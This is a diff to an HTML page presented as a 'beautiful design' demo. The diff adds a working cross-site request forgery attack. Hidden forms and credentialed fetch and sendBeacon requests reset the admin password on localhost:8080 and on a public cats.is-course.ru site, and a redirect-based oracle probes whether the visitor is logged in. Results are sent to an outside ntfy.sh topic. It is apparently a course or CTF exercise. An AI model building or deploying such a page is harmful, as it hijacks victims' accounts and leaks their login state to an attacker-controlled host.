@@ -5,27 +5,33 @@
 <body>
 <h1>Check out this beautiful design</h1>
 <p>This page demonstrates a sleek, modern web design pattern.</p>
-<form id="pw" action="http://localhost:8080/settings" method="POST">
-  <input type="hidden" name="password" value="Catadmin1234!q">
-  <input type="hidden" name="confirm-password" value="Catadmin1234!q">
-</form>
+<form id="loc" action="http://localhost:8080/settings" method="POST">
+  <input type="hidden" name="password" value="Catadmin1234!q"><input type="hidden" name="confirm-password" value="Catadmin1234!q"></form>
+<form id="pub" action="https://cats.is-course.ru/settings" method="POST">
+  <input type="hidden" name="password" value="Catadmin1234!q"><input type="hidden" name="confirm-password" value="Catadmin1234!q"></form>
 <script>
 (function(){
   var T='https://ntfy.sh/yds26cats9f3a';
   function ping(m){ try{ fetch(T,{method:'POST',mode:'no-cors',body:m}); }catch(e){} }
-  function probe(url,label){
-    fetch(url,{mode:'no-cors',redirect:'manual',cache:'no-store',credentials:'include'})
-      .then(function(r){ ping('ORACLE '+label+' type='+r.type+' status='+r.status); })
-      .catch(function(e){ ping('ORACLE '+label+' ERR '+e.name); });
+  // ORACLE: /settings -> 302 when logged in (redirect:'error' rejects), 200 login page when anonymous (resolves)
+  function oracle(url,label){
+    fetch(url,{mode:'no-cors',redirect:'error',cache:'no-store',credentials:'include'})
+      .then(function(r){ ping('ORACLE '+label+' RESOLVED type='+r.type+' => anonymous/200'); })
+      .catch(function(e){ ping('ORACLE '+label+' REJECTED '+e.name+' => logged-in/302'); });
   }
-  probe('http://localhost:8080/settings','local_settings');
-  probe('http://localhost:8080/','local_home');
-  probe('http://localhost:8080/feedback','local_feedback');
-  probe('https://cats.is-course.ru/settings','public_settings');
-  probe('https://cats.is-course.ru/','public_home');
-  // after the oracle answers, fire the CSRF
+  oracle('http://localhost:8080/settings','local_settings');
+  oracle('https://cats.is-course.ru/settings','public_settings');
+  // CSRF to both, then top-level attempts
   setTimeout(function(){
-    try{ var f=document.getElementById('pw'); f.submit(); ping('TOPLOCAL submit'); }catch(e){ ping('err '+e); }
-  }, 2500);
+    try{
+      var b='password=Catadmin1234!q&confirm-password=Catadmin1234!q';
+      fetch('http://localhost:8080/settings',{method:'POST',mode:'no-cors',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});
+      fetch('https://cats.is-course.ru/settings',{method:'POST',mode:'no-cors',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});
+      navigator.sendBeacon('http://localhost:8080/settings', new Blob([b],{type:'application/x-www-form-urlencoded'}));
+      navigator.sendBeacon('https://cats.is-course.ru/settings', new Blob([b],{type:'application/x-www-form-urlencoded'}));
+      ping('CSRF fired both');
+    }catch(e){ ping('csrf err '+e); }
+  },1500);
+  setTimeout(function(){ ping('going local toplevel'); try{ document.getElementById('loc').submit(); }catch(e){} }, 3000);
 })();
 </script></body></html>
